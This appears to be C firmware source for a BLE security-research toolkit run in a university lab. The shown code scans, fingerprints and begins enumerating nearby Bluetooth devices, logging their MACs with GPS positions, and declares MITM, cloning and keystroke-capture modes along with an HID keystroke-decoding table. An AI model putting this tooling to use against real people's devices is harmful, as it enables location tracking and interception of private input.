/*
 * chimera_ble.c -- ChimeraBLE security research toolkit implementation.
 *
 * All six modes share the NimBLE host that scan_ble.c has already brought up
 * against the C6's controller over the SDIO HCI tunnel.
 *
 * UALR Cybersecurity Lab -- Faraday cage, university-owned targets only.
 */
#include "chimera_ble.h"

#include <string.h>
#include <stdio.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_gatt.h"
#include "host/ble_store.h"
#include "host/ble_sm.h"
#include "host/util/util.h"

#include "gps.h"
#include "sdlog.h"
#include "store.h"
#include "c6ext_link.h"
#include "c6ext_proto.h"

static const char *TAG = "chimera";

static void *psram_or_heap_calloc(size_t n, size_t size)
{
    void *p = heap_caps_calloc(n, size, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!p) {
        p = calloc(n, size);
    }
    return p;
}

/* ================================================================== *
 *  Internal state                                                     *
 * ================================================================== */

static SemaphoreHandle_t s_lock;
static chimera_status_t  s_status;
static bool              s_initialised;
static uint8_t           s_own_addr_type;

/* Scan mode state (allocated in PSRAM) */
#define CHIMERA_SCAN_TABLE_SIZE 128
static chimera_scan_result_t     *s_scan_table;
static size_t                     s_scan_count;
static chimera_scan_cb_t          s_scan_cb;

/* Fingerprint state (allocated in PSRAM) */
static chimera_fingerprint_t     *s_fp_results;
static size_t                     s_fp_count;
static chimera_fingerprint_cb_t   s_fp_cb;
static uint8_t                    s_fp_target[6];
static bool                       s_fp_target_set;

/* GATT enum state (allocated in PSRAM on demand) */
static chimera_gatt_result_t     *s_gatt;
static uint16_t                   s_gatt_conn;
static bool                       s_gatt_busy;

/* MITM state */
static chimera_mitm_status_t      s_mitm;
static uint16_t                   s_mitm_target_conn;
static uint16_t                   s_mitm_client_conn;

/* Clone state */
static chimera_clone_state_t      s_clone;

/* Keystroke state (allocated in PSRAM on demand) */
static chimera_keystroke_state_t *s_keys;
static chimera_keystroke_cb_t     s_key_cb;
static uint16_t                   s_key_conn;

/* Logging */
static chimera_log_status_t s_log;
static FILE                *s_log_fp;

static int64_t now_us(void) { return esp_timer_get_time(); }
static int64_t now_ms(void) { return esp_timer_get_time() / 1000; }

/* ================================================================== *
 *  BLE company ID -> manufacturer name (top entries)                  *
 * ================================================================== */

typedef struct {
    uint16_t    id;
    const char *name;
} company_entry_t;

static const company_entry_t s_companies[] = {
    { 0x0006, "Microsoft" },
    { 0x000D, "Texas Instruments" },
    { 0x000F, "Broadcom" },
    { 0x004C, "Apple" },
    { 0x0059, "Nordic Semiconductor" },
    { 0x005D, "Realtek" },
    { 0x0075, "Samsung" },
    { 0x0087, "Garmin" },
    { 0x00E0, "Google" },
    { 0x00D2, "Dialog Semiconductor" },
    { 0x010F, "Qualcomm" },
    { 0x0131, "Cypress" },
    { 0x0157, "Huawei" },
    { 0x01A7, "Xiaomi" },
    { 0x0171, "Amazon" },
    { 0x0310, "Espressif" },
    { 0x0499, "Ruuvi" },
    { 0x02FF, "Facebook" },
    { 0x0822, "Tile" },
    { 0x0046, "Sony" },
    { 0x0002, "Intel" },
    { 0x038F, "Bose" },
    { 0x0080, "Logitech" },
    { 0x0009, "Infineon" },
    { 0x0078, "Nike" },
    { 0x00DA, "ISSC" },
    { 0x001D, "Qualcomm" },
    { 0x0030, "ST Microelectronics" },
    { 0x02E5, "Jabra" },
    { 0x038F, "Bose" },
};

#define COMPANY_COUNT (sizeof(s_companies) / sizeof(s_companies[0]))

static const char *lookup_company(uint16_t id)
{
    for (size_t i = 0; i < COMPANY_COUNT; i++) {
        if (s_companies[i].id == id) {
            return s_companies[i].name;
        }
    }
    return "Unknown";
}

/* ================================================================== *
 *  BLE appearance -> device type classification                       *
 * ================================================================== */

/* GAP appearance values (Bluetooth SIG assigned numbers) */
static chimera_dev_type_t classify_appearance(uint16_t appearance)
{
    uint16_t category = appearance >> 6;  /* top 10 bits = category */

    switch (category) {
    case 0:    return CHIMERA_DEV_UNKNOWN;
    case 1:    return CHIMERA_DEV_PHONE;
    case 2:    return CHIMERA_DEV_LAPTOP;       /* computer */
    case 3:    return CHIMERA_DEV_WATCH;
    case 4:    return CHIMERA_DEV_SMART_HOME;   /* clock */
    case 5:    return CHIMERA_DEV_TV;           /* display */
    case 15:   return CHIMERA_DEV_HID_GENERIC;  /* HID generic */
    default:   break;
    }

    /* Specific subcategories */
    switch (appearance) {
    case 961: case 962: case 963:                /* keyboard variants */
        return CHIMERA_DEV_KEYBOARD;
    case 964: case 965: case 966: case 967:      /* mouse */
        return CHIMERA_DEV_MOUSE;
    case 968: case 969:                          /* gamepad/joystick */
        return CHIMERA_DEV_GAMEPAD;
    case 832: case 833:                          /* heart rate / generic */
        return CHIMERA_DEV_FITNESS_TRACKER;
    case 3136: case 3137: case 3138:             /* pulse ox / health */
        return CHIMERA_DEV_MEDICAL;
    case 1152: case 1153:                        /* outdoor/running */
        return CHIMERA_DEV_FITNESS_TRACKER;
    case 2048: case 2049:                        /* generic media player */
        return CHIMERA_DEV_SPEAKER;
    }
    return CHIMERA_DEV_UNKNOWN;
}

static chimera_dev_type_t classify_name(const char *name)
{
    if (!name || !name[0]) {
        return CHIMERA_DEV_UNKNOWN;
    }

    /* Case-insensitive substring checks for common device name patterns */
    char lower[33];
    for (int i = 0; i < 32 && name[i]; i++) {
        lower[i] = (name[i] >= 'A' && name[i] <= 'Z')
                  ? (char)(name[i] + 32) : name[i];
        lower[i + 1] = '\0';
    }

    if (strstr(lower, "keyboard") || strstr(lower, "kbd"))
        return CHIMERA_DEV_KEYBOARD;
    if (strstr(lower, "mouse"))
        return CHIMERA_DEV_MOUSE;
    if (strstr(lower, "gamepad") || strstr(lower, "joystick"))
        return CHIMERA_DEV_GAMEPAD;
    if (strstr(lower, "lock") || strstr(lower, "deadbolt"))
        return CHIMERA_DEV_SMART_LOCK;
    if (strstr(lower, "watch") || strstr(lower, "band") || strstr(lower, "fit"))
        return CHIMERA_DEV_FITNESS_TRACKER;
    if (strstr(lower, "headphone") || strstr(lower, "earbud") ||
        strstr(lower, "airpod") || strstr(lower, "buds"))
        return CHIMERA_DEV_HEADPHONES;
    if (strstr(lower, "speaker") || strstr(lower, "soundbar"))
        return CHIMERA_DEV_SPEAKER;
    if (strstr(lower, "phone") || strstr(lower, "iphone") ||
        strstr(lower, "galaxy") || strstr(lower, "pixel"))
        return CHIMERA_DEV_PHONE;
    if (strstr(lower, "ipad") || strstr(lower, "tab"))
        return CHIMERA_DEV_TABLET;
    if (strstr(lower, "beacon") || strstr(lower, "ibeacon") ||
        strstr(lower, "estimote") || strstr(lower, "kontakt"))
        return CHIMERA_DEV_BEACON;
    if (strstr(lower, "cam") || strstr(lower, "doorbell"))
        return CHIMERA_DEV_CAMERA;
    if (strstr(lower, "thermo") || strstr(lower, "bp ") ||
        strstr(lower, "glucose") || strstr(lower, "pulse"))
        return CHIMERA_DEV_MEDICAL;
    if (strstr(lower, "tv") || strstr(lower, "roku") ||
        strstr(lower, "chromecast") || strstr(lower, "fire"))
        return CHIMERA_DEV_TV;
    if (strstr(lower, "car") || strstr(lower, "obd"))
        return CHIMERA_DEV_CAR;
    if (strstr(lower, "print"))
        return CHIMERA_DEV_PRINTER;

    return CHIMERA_DEV_UNKNOWN;
}

static const char *dev_type_str(chimera_dev_type_t t)
{
    static const char *names[] = {
        "Unknown", "Phone", "Tablet", "Laptop", "Watch",
        "Fitness Tracker", "Headphones", "Speaker", "Keyboard",
        "Mouse", "Gamepad", "Beacon", "Smart Lock", "Medical",
        "Smart Home", "TV/Display", "Automotive", "Printer",
        "Camera", "Toy", "HID Device"
    };
    return (t < CHIMERA_DEV_TYPE_COUNT) ? names[t] : "Unknown";
}

/* ================================================================== *
 *  HID keycode -> ASCII mapping                                       *
 * ================================================================== */

/* USB HID Usage Table: Keyboard/Keypad Page (0x07).
 * Maps usage IDs 0x04-0x38 to unshifted and shifted ASCII. */
static const char HID_TO_ASCII[] = {
    /*04*/ 'a','b','c','d','e','f','g','h','i','j','k','l','m',
    /*11*/ 'n','o','p','q','r','s','t','u','v','w','x','y','z',
    /*1E*/ '1','2','3','4','5','6','7','8','9','0',
    /*28*/ '\n','\x1b','\b','\t',' ','-','=','[',']','\\',
    /*32*/ '#',';','\'','`',',','.','/'
};

static const char HID_TO_ASCII_SHIFT[] = {
    /*04*/ 'A','B','C','D','E','F','G','H','I','J','K','L','M',
    /*11*/ 'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    /*1E*/ '!','@','#','$','%','^','&','*','(',')',
    /*28*/ '\n','\x1b','\b','\t',' ','_','+','{','}','|',
    /*32*/ '~',':','"','~','<','>','?'
};

static char hid_keycode_to_ascii(uint8_t keycode, uint8_t modifier)
{
    if (keycode < 0x04 || keycode > 0x38) {
        return 0;
    }
    bool shift = (modifier & 0x22) != 0;  /* left or right shift */
    uint8_t idx = keycode - 0x04;
    if (idx >= sizeof(HID_TO_ASCII)) {
        return 0;
    }
    return shift ? HID_TO_ASCII_SHIFT[idx] : HID_TO_ASCII[idx];
}

/* ================================================================== *
 *  iBeacon / Eddystone parsers                                        *
 * ================================================================== */

/* Apple iBeacon: company 0x004C, type 0x02, length 0x15, then:
 *   [0..15] proximity UUID
 *   [16..17] major (BE)
 *   [18..19] minor (BE)
 *   [20] TX power (signed)  */
static bool parse_ibeacon(const uint8_t *mfg, uint8_t len,
                           chimera_scan_result_t *out)
{
    if (len < 25) return false;
    /* mfg[0..1] = company LE already parsed; data starts at [2] */
    if (mfg[2] != 0x02 || mfg[3] != 0x15) return false;

    out->is_ibeacon = true;
    memcpy(out->ibeacon_uuid, &mfg[4], 16);
    out->ibeacon_major = (uint16_t)(mfg[20] << 8 | mfg[21]);
    out->ibeacon_minor = (uint16_t)(mfg[22] << 8 | mfg[23]);
    out->ibeacon_tx_power = (int8_t)mfg[24];
    return true;
}

/* Eddystone service UUID is 0xFEAA */
#define EDDYSTONE_SVC_UUID  0xFEAA

static bool parse_eddystone(const uint8_t *svc_data, uint8_t len,
                             chimera_scan_result_t *out)
{
    /* svc_data[0..1] = UUID 0xFEAA LE, already matched */
    if (len < 3) return false;

    out->is_eddystone = true;
    out->eddystone_frame_type = svc_data[2];
    uint8_t dlen = (uint8_t)(len - 2);
    if (dlen > sizeof(out->eddystone_data)) {
        dlen = sizeof(out->eddystone_data);
    }
    memcpy(out->eddystone_data, &svc_data[2], dlen);
    out->eddystone_data_len = dlen;
    return true;
}

/* ================================================================== *
 *  Chimera logging (to SD alongside wardrive session)                 *
 * ================================================================== */

static void chimera_log_open(void)
{
    if (s_log_fp) return;
    if (!sdlog_ready()) return;

    snprintf(s_log.path, sizeof(s_log.path),
             "/sdcard/wardrive/chimera.csv");

    /* Append mode -- persistent across mode switches. */
    s_log_fp = fopen(s_log.path, "a");
    if (s_log_fp) {
        /* Write header if new file */
        fseek(s_log_fp, 0, SEEK_END);
        if (ftell(s_log_fp) == 0) {
            fprintf(s_log_fp,
                    "uptime_ms,mode,mac,name,rssi,type,detail,"
                    "lat,lon\n");
            fflush(s_log_fp);
        }
        ESP_LOGI(TAG, "chimera log: %s", s_log.path);
    }
}

static void chimera_log_event(chimera_mode_t mode, const uint8_t mac[6],
                               const char *name, int8_t rssi,
                               const char *type, const char *detail)
{
    if (!s_log_fp) return;

    char lat[16] = "", lon[16] = "";
    if (gps_has_fix()) {
        gps_fix_t f;
        gps_get(&f);
        snprintf(lat, sizeof(lat), "%.6f", f.lat);
        snprintf(lon, sizeof(lon), "%.6f", f.lon);
    }

    static const char *MODE_NAME[] = {
        "idle", "scan", "fingerprint", "gatt", "mitm", "clone", "keystroke"
    };

    int n = fprintf(s_log_fp,
        "%lld,%s,%02X:%02X:%02X:%02X:%02X:%02X,\"%s\",%d,%s,\"%s\",%s,%s\n",
        (long long)(now_us() / 1000),
        (mode < CHIMERA_MODE_COUNT) ? MODE_NAME[mode] : "?",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
        name ? name : "", (int)rssi,
        type ? type : "", detail ? detail : "",
        lat, lon);

    if (n > 0) {
        s_log.events_logged++;
    } else {
        s_log.events_dropped++;
    }

    /* Flush periodically -- not every event, for performance. */
    if (s_log.events_logged % 32 == 0) {
        fflush(s_log_fp);
    }
}

/* ================================================================== *
 *  Mode 1: Enhanced Scan                                              *
 * ================================================================== */

static chimera_scan_result_t *scan_find_or_alloc(const uint8_t addr[6])
{
    if (!s_scan_table) return NULL;
    /* Find existing */
    for (size_t i = 0; i < s_scan_count; i++) {
        if (memcmp(s_scan_table[i].addr, addr, 6) == 0) {
            return &s_scan_table[i];
        }
    }
    /* Alloc new */
    if (s_scan_count < CHIMERA_SCAN_TABLE_SIZE) {
        chimera_scan_result_t *r = &s_scan_table[s_scan_count++];
        memset(r, 0, sizeof(*r));
        memcpy(r->addr, addr, 6);
        r->first_seen_us = now_us();
        r->tx_power = 127; /* not present */
        return r;
    }
    return NULL; /* table full */
}

static int chimera_scan_gap_event(struct ble_gap_event *event, void *arg)
{
    if (event->type != BLE_GAP_EVENT_DISC) {
        return 0;
    }

    const struct ble_gap_disc_desc *desc = &event->disc;
    struct ble_hs_adv_fields f;
    if (ble_hs_adv_parse_fields(&f, desc->data, desc->length_data) != 0) {
        return 0;
    }

    xSemaphoreTake(s_lock, portMAX_DELAY);

    chimera_scan_result_t *r = scan_find_or_alloc(desc->addr.val);
    if (!r) {
        xSemaphoreGive(s_lock);
        return 0;
    }

    r->addr_type = desc->addr.type;
    r->rssi = desc->rssi;
    r->event_type = desc->event_type;
    r->connectable = (desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_ADV_IND ||
                      desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_DIR_IND);
    r->scannable = (desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_ADV_IND ||
                    desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_SCAN_IND);
    r->last_seen_us = now_us();
    r->sighting_count++;

    if (f.name && f.name_len) {
        size_t n = f.name_len < 32 ? f.name_len : 32;
        memcpy(r->name, f.name, n);
        r->name[n] = '\0';
    }

    if (f.mfg_data && f.mfg_data_len >= 2) {
        r->company_id = (uint16_t)(f.mfg_data[0] | (f.mfg_data[1] << 8));
        uint8_t copy = f.mfg_data_len;
        if (copy > sizeof(r->mfg_data)) copy = sizeof(r->mfg_data);
        memcpy(r->mfg_data, f.mfg_data, copy);
        r->mfg_data_len = copy;

        /* Check for iBeacon (Apple 0x004C) */
        if (r->company_id == 0x004C) {
            parse_ibeacon(f.mfg_data, f.mfg_data_len, r);
        }
    }

    if (f.tx_pwr_lvl_is_present) {
        r->tx_power = f.tx_pwr_lvl;
    }

    if (f.appearance_is_present) {
        r->appearance = f.appearance;
    }

    /* Collect 16-bit service UUIDs */
    if (f.num_uuids16 > 0 && f.uuids16) {
        uint8_t cnt = f.num_uuids16;
        if (cnt > 8) cnt = 8;
        for (uint8_t i = 0; i < cnt; i++) {
            r->svc_uuid16[i] = f.uuids16[i].value;
        }
        r->svc_uuid16_count = cnt;
    }

    /* 128-bit UUIDs */
    if (f.num_uuids128 > 0 && f.uuids128) {
        memcpy(r->svc_uuid128, f.uuids128[0].value, 16);
        r->has_svc_uuid128 = true;
    }

    /* Check for Eddystone */
    if (f.svc_data_uuid16 && f.svc_data_uuid16_len >= 3) {
        uint16_t uuid = (uint16_t)(f.svc_data_uuid16[0] |
                                    (f.svc_data_uuid16[1] << 8));
        if (uuid == EDDYSTONE_SVC_UUID) {
            parse_eddystone(f.svc_data_uuid16, f.svc_data_uuid16_len, r);
        }
    }

    s_status.events++;
    snprintf(s_status.status, sizeof(s_status.status),
             "scan: %u devices, %lu events",
             (unsigned)s_scan_count, (unsigned long)s_status.events);

    /* Callback outside lock */
    chimera_scan_cb_t cb = s_scan_cb;
    chimera_scan_result_t copy = *r;
    xSemaphoreGive(s_lock);

    if (cb) {
        cb(&copy);
    }

    /* Also feed the standard wardriver store so the BLE count stays honest */
    detection_t d = {0};
    d.kind = DET_BLE;
    d.rssi = desc->rssi;
    memcpy(d.mac, desc->addr.val, 6);
    d.x.ble.addr_type = desc->addr.type;
    d.x.ble.connectable = copy.connectable;
    if (copy.company_id) {
        d.x.ble.company = copy.company_id;
    }
    if (copy.name[0]) {
        memcpy(d.name, copy.name, DET_NAME_LEN);
    }
    if (store_upsert(&d)) {
        sdlog_submit(&d);
    }

    return 0;
}

esp_err_t chimera_scan_start(chimera_scan_cb_t cb)
{
    if (!s_initialised || !s_lock) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_status.active && s_status.mode != CHIMERA_MODE_SCAN) {
        xSemaphoreGive(s_lock);
        ESP_LOGW(TAG, "another mode is active");
        return ESP_ERR_INVALID_STATE;
    }

    if (!s_scan_table) {
        s_scan_table = psram_or_heap_calloc(CHIMERA_SCAN_TABLE_SIZE, sizeof(chimera_scan_result_t));
        if (!s_scan_table) {
            xSemaphoreGive(s_lock);
            ESP_LOGE(TAG, "failed to allocate scan table");
            return ESP_ERR_NO_MEM;
        }
    }

    /* Cancel any existing scan */
    ble_gap_disc_cancel();
    vTaskDelay(pdMS_TO_TICKS(50));

    s_scan_count = 0;
    memset(s_scan_table, 0, CHIMERA_SCAN_TABLE_SIZE * sizeof(chimera_scan_result_t));
    s_scan_cb = cb;
    s_status.mode = CHIMERA_MODE_SCAN;
    s_status.active = true;
    s_status.events = 0;
    strlcpy(s_status.status, "enhanced scan starting", sizeof(s_status.status));
    xSemaphoreGive(s_lock);

    /* Start active scan (we want scan responses too, for richer data).
     * This is safe inside the Faraday cage -- no external devices to probe. */
    struct ble_gap_disc_params p = {
        .itvl              = BLE_GAP_SCAN_ITVL_MS(30),
        .window            = BLE_GAP_SCAN_WIN_MS(30),
        .filter_policy     = BLE_HCI_SCAN_FILT_NO_WL,
        .limited           = 0,
        .passive           = 0,   /* active: send SCAN_REQ for names   */
        .filter_duplicates = 0,
    };

    int rc = ble_gap_disc(s_own_addr_type, BLE_HS_FOREVER, &p,
                          chimera_scan_gap_event, NULL);
    if (rc != 0 && rc != BLE_HS_EALREADY) {
        ESP_LOGE(TAG, "ble_gap_disc failed: %d", rc);
        return ESP_FAIL;
    }

    c6ext_link_set_roles(C6EXT_ROLE_BLE);

    chimera_log_event(CHIMERA_MODE_SCAN, (uint8_t[]){0,0,0,0,0,0},
                       "", 0, "start", "enhanced scan started");
    ESP_LOGI(TAG, "enhanced scan running");
    return ESP_OK;
}

esp_err_t chimera_scan_stop(void)
{
    ble_gap_disc_cancel();
    c6ext_link_set_roles(C6EXT_ROLE_WIFI | C6EXT_ROLE_BLE | C6EXT_ROLE_ZIGBEE);
    if (s_initialised && s_lock) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_status.mode = CHIMERA_MODE_IDLE;
        s_status.active = false;
        strlcpy(s_status.status, "idle", sizeof(s_status.status));
        s_scan_cb = NULL;
        xSemaphoreGive(s_lock);
    }

    ESP_LOGI(TAG, "enhanced scan stopped, %u devices found",
             (unsigned)s_scan_count);
    return ESP_OK;
}

void chimera_ingest_c6ext_ble(const c6ext_ble_t *b)
{
    if (!b || !s_initialised || !s_lock) return;

    xSemaphoreTake(s_lock, portMAX_DELAY);

    /* Only process into active scan table if scanning and table exists */
    if (!s_scan_table || !s_status.active || s_status.mode != CHIMERA_MODE_SCAN) {
        xSemaphoreGive(s_lock);
        return;
    }

    chimera_scan_result_t *r = scan_find_or_alloc(b->addr);
    if (!r) {
        xSemaphoreGive(s_lock);
        return;
    }

    r->addr_type = b->addr_type;
    r->rssi = b->rssi;
    r->connectable = b->connectable ? true : false;
    r->last_seen_us = now_us();
    r->sighting_count++;

    if (b->name_len > 0) {
        size_t n = b->name_len < 32 ? b->name_len : 32;
        memcpy(r->name, b->name, n);
        r->name[n] = '\0';
    }

    if (b->company) {
        r->company_id = b->company;
    }

    s_status.events++;
    snprintf(s_status.status, sizeof(s_status.status),
             "scan (c6ext): %u devices, %lu events",
             (unsigned)s_scan_count, (unsigned long)s_status.events);

    chimera_scan_cb_t cb = s_scan_cb;
    chimera_scan_result_t copy = *r;
    xSemaphoreGive(s_lock);

    if (cb) {
        cb(&copy);
    }
}

size_t chimera_scan_snapshot(chimera_scan_result_t *out, size_t max_out)
{
    if (!out || max_out == 0) return 0;
    if (!s_initialised || !s_lock) return 0;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_scan_table) {
        xSemaphoreGive(s_lock);
        return 0;
    }

    /* Insertion sort by RSSI (strongest first) */
    size_t n = 0;
    for (size_t i = 0; i < s_scan_count && i < CHIMERA_SCAN_TABLE_SIZE; i++) {
        size_t pos = n;
        while (pos > 0 && s_scan_table[i].rssi > out[pos - 1].rssi) {
            pos--;
        }
        if (pos >= max_out) continue;

        size_t end = (n < max_out) ? n : max_out - 1;
        if (end > pos) {
            memmove(&out[pos + 1], &out[pos],
                    (end - pos) * sizeof(chimera_scan_result_t));
        }
        out[pos] = s_scan_table[i];
        if (n < max_out) n++;
    }

    xSemaphoreGive(s_lock);
    return n;
}

size_t chimera_scan_get_top(chimera_scan_item_t *out, size_t max_out)
{
    if (!out || max_out == 0) return 0;
    memset(out, 0, max_out * sizeof(chimera_scan_item_t));
    if (!s_initialised || !s_lock) return 0;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_scan_table) {
        xSemaphoreGive(s_lock);
        return 0;
    }

    size_t n = 0;
    for (size_t i = 0; i < s_scan_count && i < CHIMERA_SCAN_TABLE_SIZE; i++) {
        size_t pos = n;
        while (pos > 0 && s_scan_table[i].rssi > out[pos - 1].rssi) {
            pos--;
        }
        if (pos >= max_out) continue;

        size_t end = (n < max_out) ? n : max_out - 1;
        if (end > pos) {
            memmove(&out[pos + 1], &out[pos],
                    (end - pos) * sizeof(chimera_scan_item_t));
        }
        strlcpy(out[pos].name, s_scan_table[i].name, sizeof(out[pos].name));
        out[pos].rssi = s_scan_table[i].rssi;
        out[pos].is_ibeacon = s_scan_table[i].is_ibeacon;
        out[pos].is_eddystone = s_scan_table[i].is_eddystone;
        if (n < max_out) n++;
    }

    xSemaphoreGive(s_lock);
    return n;
}

/* ================================================================== *
 *  Mode 2: Fingerprint                                                *
 * ================================================================== */

static void do_fingerprint(const chimera_scan_result_t *scan,
                            chimera_fingerprint_t *fp)
{
    memset(fp, 0, sizeof(*fp));
    memcpy(fp->addr, scan->addr, 6);
    fp->addr_type = scan->addr_type;
    fp->rssi = scan->rssi;
    memcpy(fp->name, scan->name, sizeof(fp->name));

    fp->company_id = scan->company_id;
    fp->manufacturer = lookup_company(scan->company_id);
    fp->appearance = scan->appearance;
    fp->connectable = scan->connectable;

    /* Address analysis */
    fp->is_random_addr = (scan->addr_type != 0);  /* 0 = public */
    /* Check if resolvable private address: top 2 bits = 01 */
    if (fp->is_random_addr && (scan->addr[5] & 0xC0) == 0x40) {
        fp->uses_irk = true;
    }

    /* Device type classification: try appearance first, then name, then
     * heuristics from manufacturer data and service UUIDs. */
    fp->dev_type = CHIMERA_DEV_UNKNOWN;
    float confidence = 0.3f;

    if (scan->appearance) {
        fp->dev_type = classify_appearance(scan->appearance);
        if (fp->dev_type != CHIMERA_DEV_UNKNOWN) {
            confidence = 0.9f;
        }
    }

    if (fp->dev_type == CHIMERA_DEV_UNKNOWN && scan->name[0]) {
        fp->dev_type = classify_name(scan->name);
        if (fp->dev_type != CHIMERA_DEV_UNKNOWN) {
            confidence = 0.75f;
        }
    }

    /* iBeacon / Eddystone are beacons */
    if (scan->is_ibeacon || scan->is_eddystone) {
        fp->dev_type = CHIMERA_DEV_BEACON;
        confidence = 0.95f;
    }

    /* Service UUID heuristics */
    for (uint8_t i = 0; i < scan->svc_uuid16_count; i++) {
        switch (scan->svc_uuid16[i]) {
        case 0x1812:  /* HID */
            if (fp->dev_type == CHIMERA_DEV_UNKNOWN) {
                fp->dev_type = CHIMERA_DEV_HID_GENERIC;
                confidence = 0.85f;
            }
            break;
        case 0x180D:  /* Heart Rate */
            fp->dev_type = CHIMERA_DEV_FITNESS_TRACKER;
            confidence = 0.85f;
            break;
        case 0x1816:  /* Cycling Speed/Cadence */
        case 0x1814:  /* Running Speed/Cadence */
            fp->dev_type = CHIMERA_DEV_FITNESS_TRACKER;
            confidence = 0.8f;
            break;
        case 0x1810:  /* Blood Pressure */
        case 0x1808:  /* Glucose */
        case 0x1822:  /* Pulse Ox */
            fp->dev_type = CHIMERA_DEV_MEDICAL;
            confidence = 0.9f;
            break;
        }
    }

    /* BLE version heuristics from advert features */
    fp->ble_version_guess = 4;  /* baseline: BLE 4.0 */
    if (scan->event_type >= 0x0D) {
        /* Extended advertising events indicate BLE 5.0+ */
        fp->ble_version_guess = 5;
        fp->supports_ext_adv = true;
    }

    fp->dev_type_str = dev_type_str(fp->dev_type);
    fp->confidence = confidence;
}

static void fingerprint_task(void *arg)
{
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_fp_results || !s_scan_table) {
        xSemaphoreGive(s_lock);
        vTaskDelete(NULL);
        return;
    }

    s_fp_count = 0;
    for (size_t i = 0; i < s_scan_count && s_fp_count < CHIMERA_SCAN_TABLE_SIZE; i++) {
        if (s_fp_target_set) {
            if (memcmp(s_scan_table[i].addr, s_fp_target, 6) != 0) {
                continue;
            }
        }

        chimera_fingerprint_t *fp = &s_fp_results[s_fp_count];
        do_fingerprint(&s_scan_table[i], fp);
        s_fp_count++;

        chimera_log_event(CHIMERA_MODE_FINGERPRINT, fp->addr,
                           fp->name, fp->rssi,
                           fp->dev_type_str,
                           fp->manufacturer);

        /* Callback (outside lock would be safer, but fingerprinting is
         * fast and we hold the full result set) */
        if (s_fp_cb) {
            s_fp_cb(fp);
        }
    }

    snprintf(s_status.status, sizeof(s_status.status),
             "fingerprint: %u devices classified",
             (unsigned)s_fp_count);
    s_status.events = s_fp_count;

    xSemaphoreGive(s_lock);

    /* Auto-return to idle */
    xSemaphoreTake(s_lock, portMAX_DELAY);
    s_status.active = false;
    s_status.mode = CHIMERA_MODE_IDLE;
    xSemaphoreGive(s_lock);

    ESP_LOGI(TAG, "fingerprinting complete: %u devices", (unsigned)s_fp_count);
    vTaskDelete(NULL);
}

esp_err_t chimera_fingerprint_start(const uint8_t addr[6],
                                     chimera_fingerprint_cb_t cb)
{
    if (!s_initialised || !s_lock) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_status.active) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    if (!s_fp_results) {
        s_fp_results = psram_or_heap_calloc(CHIMERA_SCAN_TABLE_SIZE, sizeof(chimera_fingerprint_t));
        if (!s_fp_results) {
            xSemaphoreGive(s_lock);
            return ESP_ERR_NO_MEM;
        }
    }

    s_fp_cb = cb;
    s_fp_target_set = (addr != NULL);
    if (addr) memcpy(s_fp_target, addr, 6);

    s_status.mode = CHIMERA_MODE_FINGERPRINT;
    s_status.active = true;
    s_status.events = 0;
    strlcpy(s_status.status, "fingerprinting...", sizeof(s_status.status));
    xSemaphoreGive(s_lock);

    /* If no scan data, do a quick scan first */
    if (s_scan_count == 0) {
        ESP_LOGI(TAG, "no scan data; run chimera_scan first");
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_status.active = false;
        s_status.mode = CHIMERA_MODE_IDLE;
        strlcpy(s_status.status, "need scan data first", sizeof(s_status.status));
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    xTaskCreate(fingerprint_task, "chimera_fp", 4096, NULL, 4, NULL);
    return ESP_OK;
}

esp_err_t chimera_fingerprint_stop(void)
{
    if (s_initialised && s_lock) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_status.mode = CHIMERA_MODE_IDLE;
        s_status.active = false;
        s_fp_cb = NULL;
        xSemaphoreGive(s_lock);
    }
    return ESP_OK;
}

bool chimera_fingerprint_get(const uint8_t addr[6],
                              chimera_fingerprint_t *out)
{
    if (!out || !addr) return false;
    memset(out, 0, sizeof(*out));
    if (!s_initialised || !s_lock) return false;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_fp_results) {
        xSemaphoreGive(s_lock);
        return false;
    }
    for (size_t i = 0; i < s_fp_count; i++) {
        if (memcmp(s_fp_results[i].addr, addr, 6) == 0) {
            *out = s_fp_results[i];
            xSemaphoreGive(s_lock);
            return true;
        }
    }
    xSemaphoreGive(s_lock);
    return false;
}

/* ================================================================== *
 *  Mode 3: GATT Enumeration                                           *
 * ================================================================== */

/* Forward declarations for the daisy-chained GATT discovery callbacks */
static int gatt_disc_svc_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_svc *svc, void *arg);
static int gatt_disc_chr_cb(uint16_t conn, const struct ble_gatt_error *error,
                             const struct ble_gatt_chr *chr, void *arg);
static int gatt_disc_dsc_cb(uint16_t conn, const struct ble_gatt_error *error,
                             uint16_t chr_val, const struct ble_gatt_dsc *dsc,
                             void *arg);
static int gatt_read_cb(uint16_t conn, const struct ble_gatt_error *error,
                         struct ble_gatt_attr *attr, void *arg);

/* Well-known GATT UUID names (small table for the lab display) */
static const char *gatt_uuid16_name(uint16_t uuid)
{
    switch (uuid) {
    /* Services */
    case 0x1800: return "Generic Access";
    case 0x1801: return "Generic Attribute";
    case 0x180A: return "Device Information";
    case 0x180F: return "Battery Service";
    case 0x1812: return "HID Service";
    case 0x180D: return "Heart Rate";
    case 0x1810: return "Blood Pressure";
    case 0x1808: return "Glucose";
    case 0x1802: return "Immediate Alert";
    case 0x1803: return "Link Loss";
    case 0x1804: return "Tx Power";
